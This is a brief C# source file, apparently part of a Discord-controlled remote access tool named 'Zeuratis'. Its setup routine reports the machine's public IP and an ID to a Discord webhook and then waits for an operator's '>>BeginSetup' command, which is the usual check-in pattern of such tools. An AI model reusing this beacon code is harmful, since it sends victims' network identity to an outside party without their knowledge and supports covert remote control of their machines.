namespace Zeuratis;

partial class DiscordBot
{
    private static readonly DiscWebHook s_DiscWH = new(Credentials.SetupWHToken);
    public static async Task Setup()
    {
        await s_DiscWH.SendMessageAsync(Net.GetPublicIP().Result, $"New user with IP: {Net.GetPublicIP().Result} and with defualt ID: {ZeuratisSetup.DefaultId}", "Setup New User", "9871276", true);
        Thread.Sleep(250);
        await s_DiscWH.SendMessageAsync(Net.GetPublicIP().Result, $"Do you wish to continue with setup? (>>BeginSetup (int Id))", "Setup New User", "9871276");
    }
}
